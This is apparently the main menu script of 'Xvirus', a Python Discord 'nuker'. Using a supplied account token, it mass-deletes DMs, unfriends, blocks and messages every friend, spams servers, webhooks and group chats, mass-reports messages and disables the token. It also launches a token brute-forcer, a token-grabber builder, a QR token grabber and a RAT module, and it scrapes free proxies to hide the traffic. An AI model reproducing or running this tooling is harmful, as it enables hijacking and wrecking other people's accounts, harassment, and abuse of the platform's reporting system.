from util.plugins.common import *
import util.accountNuke
import util.dmdeleter
import util.info
import util.login
import util.groupchat_spammer
import util.massreport
import util.seizure
import util.server_leaver
import util.spamservers
import util.profilechanger
import util.friend_blocker
import util.unfriender
import util.webhookspammer
import util.massdm
import util.tokendisable
import util.vanitysniper

System.Size(120, 30)

threads = 3
cancel_key = "ctrl+x"
current_dir = os.path.dirname(os.path.abspath(__file__))
XCOLOR_FADE = Colors.blue_to_purple
                                                                            #Xproxy define
###############################################################################################################################################################################################################
def xproxy_scrape(): 
    proxieslog = []
    setTitle("Scraping Proxies")
    #start timer
    startTime = time.time()
    #save in same file
    current_dir = os.path.dirname(os.path.abspath(__file__))
    temp = current_dir + "\\xproxy_proxies"
    #banner
    Anime.Fade((Xlogo), (XCOLOR_FADE), Colorate.Vertical, time=5)
    
    def fetchXproxies(url, custom_regex):
        global proxylist
        try:
            proxylist = requests.get(url, timeout=5).text
        except Exception:
            pass
        finally:
            proxylist = proxylist.replace('null', '')
        #get the proxies from all the sites with the custom regex
        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
        for proxy in re.findall(re.compile(custom_regex), proxylist):
            proxieslog.append(f"{proxy[0]}:{proxy[1]}")

    #all urls
    proxysources = [
        ["http://spys.me/proxy.txt","%ip%:%port% "],
        ["http://www.httptunnel.ge/ProxyListForFree.aspx"," target=\"_new\">%ip%:%port%</a>"],
        ["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json", "\"ip\":\"%ip%\",\"port\":\"%port%\","],
        ["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list", '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
        ["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt", '%ip%:%port% (.*?){2}-.-S \\+'],
        ["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt", '%ip%", "type": "http", "port": %port%'],
        ["https://www.us-proxy.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://free-proxy-list.net/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://www.sslproxies.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=6000&country=all&ssl=yes&anonymity=all", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
        ["https://proxylist.icu/proxy/", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
        ["https://www.hide-my-ip.com/proxylist.shtml", '"i":"%ip%","p":"%port%",'],
        ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json", '"ip": "%ip%",\n.*?"port": "%port%",']
    ]
    threads = [] 
    for url in proxysources:
        #send them out in threads
        t = threading.Thread(target=fetchXproxies, args=(url[0], url[1]))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    proxies = list(set(proxieslog))
    with open(temp + ".json", "w") as f:
        json.dump(proxies, f, indent=4)
    #get the time it took to scrape
    execution_time = (time.time() - startTime)
    print_slow(f"{Fore.GREEN}Done! Scraped And Saved As A JSON File.{Fore.MAGENTA}{len(proxies): >5}{Fore.GREEN} in total => {Fore.RED}{temp}{Fore.RESET} | {execution_time}ms")
    print_slow(f"\nExiting in 6 seconds...")
    time.sleep(6)
    main()
################################################################################################################################################################################################################
def ping(host):
    while True:
        if keyboard.is_pressed(cancel_key):
            print(f"Press {cancel_key} to stop")
            os.system("cls" if os.name == "nt" else "clear")
            output = subprocess.check_output(["ping", host]).decode("utf-8")
            print(output)
            time.sleep(0.5)
        main()
            
def main():
    setTitle(f"Xvirus {THIS_VERSION}")
    clear()
    global threads
    global cancel_key
    if getTheme() == "xeme":
        banner()
    elif getTheme() == "dark":
        banner("dark")
    elif getTheme() == "fire":
        banner("fire")
    elif getTheme() == "aqua":
        banner("aqua")
    elif getTheme() == "neon":
        banner("neon")

    choice = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Choice: {Fore.RED}').lstrip("0")# so if stupid users use 01 it removed the 0
    #all options
    if choice == "1":
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        Server_Name = str(input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Name of the servers that will be created: {Fore.RED}'))
        message_Content = str(input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message that will be sent to every friend: {Fore.RED}'))
        if threading.active_count() < threads:
            threading.Thread(target=util.accountNuke.Xvirus_Nuke, args=(token, Server_Name, message_Content)).start()
            return


    elif choice == '2':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        #get all friends
        processes = []
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = multiprocessing.Process(target=util.unfriender.UnFriender, args=(token, friend))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '3':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        if token.startswith("mfa."):
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Just a headsup Xvirus wont be able to delete the servers since the account has 2fa enabled')
            sleep(3)
        processes = []
        #get all servers
        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
        for guild in [guildsIds[i:i+3] for i in range(0, len(guildsIds), 3)]:
            t = multiprocessing.Process(target=util.server_leaver.Leaver, args=(token, guild))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break
                

    elif choice == '4':
        token = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.BLUE}Do you want to have a icon for the servers that will be created?')
        yesno = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}yes/no: {Fore.RED}')
        if yesno.lower() == "yes":
            image = input(f'Example: (C:\\Users\\myName\\Desktop\\Xvirus\\ShitOn.png):\n{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Please input the icon location: {Fore.RED}')
            if not os.path.exists(image):
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Couldn\'t find "{image}" on your pc')
                sleep(3)
                main()
            with open(image, "rb") as f: _image = f.read()
            b64Bytes = base64.b64encode(_image)
            icon = f"data:image/x-icon;base64,{b64Bytes.decode()}"
        else:
            icon = None
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Random server names
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Custom server names  
                        ''')
        secondchoice = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Second Choice: {Fore.RED}')
        if secondchoice not in ["1", "2"]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice')
            sleep(1)
            main()
        if secondchoice == "1":
            processes = []
            for i in range(25):
                t = multiprocessing.Process(target=util.spamservers.SpamServers, args=(token, icon))
                t.start()
                processes.append(t)
            while True:
                if keyboard.is_pressed(cancel_key):
                    for process in processes:
                        process.terminate()
                    main()
                    break

        if secondchoice == "2":
            name = str(input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Name of the servers that will be created: {Fore.RED}'))
            processes = []
            for i in range(25):
                t = multiprocessing.Process(target=util.spamservers.SpamServers, args=(token, icon, name))
                t.start()
                processes.append(t)
            while True:
                if keyboard.is_pressed(cancel_key):
                    for process in processes:
                        process.terminate()
                    main()
                    break


    elif choice == '5':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
                t = multiprocessing.Process(target=util.dmdeleter.DmDeleter, args=(token, channel))
                t.start()
                processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '6':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        message = str(input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message that will be sent to every friend: {Fore.RED}'))
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
            t = multiprocessing.Process(target=util.massdm.MassDM, args=(token, channel, message))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '7':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
        processes = [] 
        for i in range(threads):
            t = multiprocessing.Process(target=util.seizure.StartSeizure, args=(token, ))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '8':
        token = input(
        f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        util.info.Info(token)


    elif choice == '9':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        util.login.TokenLogin(token)

    elif choice == '10':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        processes = []
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = multiprocessing.Process(target=util.friend_blocker.Block, args=(token, friend))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '11':
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Status changer
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Bio changer
    {Fore.RESET}[{Fore.RED}3{Fore.RESET}] HypeSquad changer    
                        ''')
        secondchoice = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Setting: {Fore.RED}')
        if secondchoice not in ["1", "2", "3"]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
            sleep(1)
            main()
        if secondchoice == "1":
            status = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Custom Status: {Fore.RED}')
            util.profilechanger.StatusChanger(token, status)

        if secondchoice == "2":
            bio = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Custom bio: {Fore.RED}')
            util.profilechanger.BioChanger(token, bio)

        if secondchoice == "3":
            print(f'''
        {Fore.RESET}[{Fore.MAGENTA}1{Fore.RESET}]{Fore.MAGENTA} HypeSquad Bravery
        {Fore.RESET}[{Fore.RED}2{Fore.RESET}]{Fore.LIGHTRED_EX} HypeSquad Brilliance
        {Fore.RESET}[{Fore.LIGHTGREEN_EX}3{Fore.RESET}]{Fore.LIGHTGREEN_EX} HypeSquad Balance
                        ''')
            thirdchoice = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Hypesquad: {Fore.RED}')
            if thirdchoice not in ["1", "2", "3"]:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
                sleep(1)
                main()
            if thirdchoice == "1":
                util.profilechanger.HouseChanger(token, 1)
            if thirdchoice == "2":
                util.profilechanger.HouseChanger(token, 2)
            if thirdchoice == "3":
                util.profilechanger.HouseChanger(token, 3)


    elif choice == '12':
        exec(open('util/tokenbrute.py').read())


    elif choice == '13':
        exec(open('util/grabberbuilder.py').read())

    elif choice == '14':
        exec(open('util/qrgrabb.py').read())
        main()



    elif choice == '15':
        print(f"\n{Fore.RED}(the token you input is the account that will send the reports){Fore.RESET}")
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        guild_id1 = str(input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Server ID: {Fore.RED}'))
        channel_id1 = str(input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Channel ID: {Fore.RED}'))
        message_id1 = str(input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message ID: {Fore.RED}'))
        reason1 = str(input(
            '\n[1] Illegal content\n'
            '[2] Harassment\n'
            '[3] Spam or phishing links\n'
            '[4] Self-harm\n'
            '[5] NSFW content\n\n'
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Reason: {Fore.RED}'))
        if reason1.upper() in ('1', 'ILLEGAL CONTENT'):
            reason1 = 0
        elif reason1.upper() in ('2', 'HARASSMENT'):
            reason1 = 1
        elif reason1.upper() in ('3', 'SPAM OR PHISHING LINKS'):
            reason1 = 2
        elif reason1.upper() in ('4', 'SELF-HARM'):
            reason1 = 3
        elif reason1.upper() in ('5', 'NSFW CONTENT'):
            reason1 = 4
        else:
            print(f"\nInvalid reason")
            sleep(1)
            main()
        util.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1)


    elif choice == "16":
        token = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Token: {Fore.RED}')
        validateToken(token)
        util.groupchat_spammer.GcSpammer(token)


    elif choice == '17':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Webhook Deleter
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
                        ''')
        secondchoice = int(input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Second Choice: {Fore.RED}'))
        if secondchoice not in [1, 2]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice')
            sleep(1)
            main()
        if secondchoice == 1:
            WebHook = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            try:
                requests.delete(WebHook)
                print(f'\n{Fore.GREEN}Webhook Successfully Deleted!{Fore.RESET}\n')
            except Exception as e:
                print(f'{Fore.RED}Error: {Fore.WHITE}{e} {Fore.RED}happened while trying to delete the Webhook')

            input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Enter anything to continue. . . {Fore.RED}')
            main()
        if secondchoice == 2:
            WebHook = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            Message = str(input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Message: {Fore.RED}'))
            util.webhookspammer.WebhookSpammer(WebHook, Message)

    elif choice == '18':
        exec(open('util/tokenchecker.py').read())

    elif choice == '19':
        TokenDisable

        
    elif choice == '20':
        exec(open('util/rat.py').read())

    elif choice == '21':
        exec(open('util/vanitysniper.py').read())
        
    elif choice == '22':
        exec(open('util/dmclear.py').read())

    elif choice == '23':
        xproxy_scrape()

    elif choice == '24':
        print_slow(f"\n{Fore.RED}(This option is still WIP it will be included in one of the next updates.){Fore.RESET}")
        sleep(1)
        main()

    elif choice == '25':
        print_slow(f"\n{Fore.RED}(This option is still WIP it will be included in one of the next updates.){Fore.RESET}")
        sleep(1)
        main()

    elif choice == '26':
        print_slow(f"\n{Fore.RED}(This option is still WIP it will be included in one of the next updates.){Fore.RESET}")
        sleep(1)
        main()

    elif choice == '27':
        print_slow(f"\n{Fore.RED}(This option is still WIP it will be included in one of the next updates.){Fore.RESET}")
        sleep(1)
        main()

    elif choice == '?':
        CHANGE_LOG()
        main()

    elif choice == 'ai':
        exec(open('util/gpt.py').read())
        main()

    elif choice == 'TM':
            print(f"""                                            Development Networks:\n\n                                                GitHub:    @DXVVAY, @Xvirus0, @Cwackz(Benjamin)\n\n\n                                            Other Networks\n\n                                                Twitter:   @dexvisnotgay\n                                                Discord:   DEXV#6969, benjamin#6666\n\n\n\n""")
            input("Press Enter To Exit!")
            main()
    
    elif choice == 'PING':
        ping("google.com")
        input("Press ENTER to continue")
        main()

    # this is end settings
    elif choice == '!':
        print(f'''
    {Fore.BLUE}[{Fore.RED}1{Fore.BLUE}] Theme changer
    {Fore.BLUE}[{Fore.RED}2{Fore.BLUE}] Amount of threads
    {Fore.BLUE}[{Fore.RED}3{Fore.BLUE}] Cancel key
    {Fore.BLUE}[{Fore.RED}4{Fore.BLUE}] Startup Logo Color (WIP)
    {Fore.BLUE}[{Fore.RED}5{Fore.BLUE}] {Fore.RED}Exit...    
                        ''')
        secondchoice = input(
            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Setting: {Fore.RED}')
        if secondchoice not in ["1", "2", "3", "4", "5"]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Setting')
            sleep(1)
            main()
        if secondchoice == "1":
            print(f"""
    {Fore.RED}Xeme: 1
    {Fore.LIGHTBLACK_EX}Dark: 2
    {Fore.YELLOW}Fire: 3
    {Fore.BLUE}Aqua: 4
    {Fore.CYAN}N{Fore.MAGENTA}e{Fore.CYAN}o{Fore.MAGENTA}n{Fore.CYAN}:{Fore.MAGENTA} 5
    """)
            themechoice = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}theme: {Fore.RED}')
            if themechoice == "1":
                setTheme('xeme')
            elif themechoice == "2":
                setTheme('dark')
            elif themechoice == "3":
                setTheme('fire')
            elif themechoice == "4":
                setTheme('aqua')
            elif themechoice == "5":
                setTheme('neon')
            else:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Theme')
                sleep(1.5)
                main()
            print_slow(f"{Fore.GREEN}Theme set to {Fore.CYAN}{getTheme()}")
            sleep(0.5)
            main()

        elif secondchoice == "2":
            print(f"{Fore.BLUE}Current amount of threads: {threads}")
            try:
                amount = int(
                    input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Amount of threads: {Fore.RED}'))
            except ValueError:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid amount')
                sleep(1.5)
                main()
            if amount >= 45:
                print(f"{Fore.RED}Sorry but having this many threads will just get you ratelimited and not end up well")
                sleep(3)
                main()
            elif amount >= 15:
                print(f"{Fore.RED}WARNING! * WARNING! * WARNING! * WARNING! * WARNING! * WARNING! * WARNING!")
                print(f"having the thread amount set to 15 or over can possible get laggy and higher chance of ratelimit\nare you sure you want to set the ratelimit to {Fore.YELLOW}{amount}{Fore.RED}?")
                yesno = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}yes/no: {Fore.RED}')
                if yesno.lower() != "yes":
                    sleep(0.5)
                    main()
            threads = amount
            print_slow(f"{Fore.GREEN}Threads set to {Fore.CYAN}{amount}")
            sleep(0.5)
            main()
        
        elif secondchoice == "3":
            print("\n","Info".center(30, "-"))
            print(f"{Fore.CYAN}Current cancel key: {cancel_key}")
            print(f"""{Fore.BLUE}If you want to have ctrl + <key> you need to type out ctrl+<key> | DON'T literally press ctrl + <key>
        {Fore.GREEN}Example: shift+Q

        {Fore.RED}You can have other modifiers instead of ctrl ⇣
        {Fore.YELLOW}All keyboard modifiers:{Fore.RESET}
        ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl, alt gr, left alt, right alt
        """)
            sleep(1.5)
            key = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Key: {Fore.RED}')
            cancel_key = key
            print_slow(f"{Fore.GREEN}Cancel key set to {Fore.CYAN}{cancel_key}")
            sleep(0.5)
            main()

        elif secondchoice == "4" :
            logocolorchanger()
            main()


            

        elif secondchoice == "5":
            setTitle("Exiting. . .")
            choice = input(
                f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Are you sure you want to exit? (Y to confirm): {Fore.RED}')
            if choice.upper() == 'Y':
                clear()
                os._exit(0)
            else:
                main()
    else:
        clear()
        main()

if __name__ == "__main__":
    import sys
    setTitle("Xvirus Loading...")
    
    System.Size(120, 30)
    if os.path.basename(sys.argv[0]).endswith("exe"):
        check_wifi_connection()
        search_for_updates()
        with open(os.getenv("temp")+"\\xvirus_proxies", 'w'): pass
        if not os.path.exists(os.getenv("temp")+"\\xvirus_theme"):
            setTheme('xeme')
        proxy_scrape()
        sleep(1.5)
        main()
    try:
        assert sys.version_info >= (3,7)
    except AssertionError:
        print(f"{Fore.RED}Woopsie daisy, your python version ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) is not compatible with xvirus nuker, please download python 3.7+")
        sleep(5)
        print("exiting. . .")
        sleep(1.5)
        os._exit(0)
    else:
        check_wifi_connection()
        search_for_updates()
        with open(os.getenv("temp")+"\\xvirus_proxies", 'w'): pass
        if not os.path.exists(os.getenv("temp")+"\\xvirus_theme"):
            setTheme('xeme')
        proxy_scrape()
        sleep(1.5)
        main()
    finally:
        Fore.RESET
